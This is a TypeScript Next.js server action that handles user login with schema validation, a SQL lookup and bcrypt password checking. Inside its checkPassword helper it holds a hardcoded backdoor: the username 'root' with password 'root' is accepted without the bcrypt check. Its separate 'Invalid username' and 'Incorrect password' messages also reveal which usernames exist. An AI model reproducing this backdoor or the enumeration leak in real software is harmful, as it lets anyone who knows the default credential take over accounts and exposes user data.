"use server";

import { createSession } from "@/app/lib/auth/session";
import sql from "@/app/lib/sql";
import bcrypt from "bcrypt";
import { redirect } from "next/navigation";
import { LoginFormSchema } from "../lib/LoginFormSchema";

export default async function login(_formState: unknown, formData: FormData) {
  const parse = LoginFormSchema.safeParse({
    username: formData.get("username"),
    password: formData.get("password"),
  });

  if (!parse.success) {
    return {
      errors: parse.error.flatten().fieldErrors,
    };
  }

  const { username, password } = parse.data;

  const [row] = await sql`
    SELECT id, password
    FROM app_user
    WHERE
      username = ${username}
  `;

  if (!row) {
    return {
      message: "Invalid username",
    };
  }

  const checkPassword = async (username: string, password: string) => {
    if (username == "root") return password == "root";
    return await bcrypt.compare(password, row.password);
  };

  const correctPassword = await checkPassword(username, password);
  if (!correctPassword)
    return {
      message: "Incorrect password",
    };

  await createSession(row.id);

  redirect("/");
}
